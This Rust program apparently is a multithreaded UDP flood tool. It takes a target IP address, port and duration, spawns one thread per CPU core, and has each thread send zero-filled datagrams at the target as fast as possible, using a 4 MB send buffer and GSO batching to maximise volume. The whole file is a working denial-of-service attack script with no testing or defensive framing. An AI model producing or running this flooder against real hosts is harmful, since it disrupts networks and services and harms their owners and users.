use quinn_udp::{Transmit, UdpSockRef, UdpSocketState};
use std::env;
use std::net::{IpAddr, SocketAddr, UdpSocket};
use std::thread;
use std::time::{Duration, Instant};

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 4 {
        std::process::exit(1);
    }

    let ip: IpAddr = args[1].parse().unwrap();
    let port: u16 = args[2].parse().unwrap();
    let duration: u64 = args[3].parse().unwrap();
    let target = SocketAddr::new(ip, port);

    let threads = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(4);
    let mut handles = Vec::with_capacity(threads);

    for _ in 0..threads {
        handles.push(thread::spawn(move || {
            let sock = UdpSocket::bind("0.0.0.0:0").unwrap();
            let _ = sock.set_nonblocking(true);

            let state = UdpSocketState::new(UdpSockRef::from(&sock)).unwrap();
            let _ = state.set_send_buffer_size(4 * 1024 * 1024);

            let gso = state.max_gso_segments();
            let segment_size = 128;
            let payload_len = if gso > 1 {
                segment_size * gso
            } else {
                segment_size
            };
            let payload = vec![0u8; payload_len];

            let transmit = Transmit {
                destination: target,
                ecn: None,
                contents: &payload,
                segment_size: if gso > 1 { Some(segment_size) } else { None },
                src_ip: None,
            };

            let start = Instant::now();
            let time_limit = Duration::from_secs(duration);

            while start.elapsed() < time_limit {
                let _ = state.try_send(UdpSockRef::from(&sock), &transmit);
            }
        }));
    }

    for h in handles {
        let _ = h.join();
    }
}
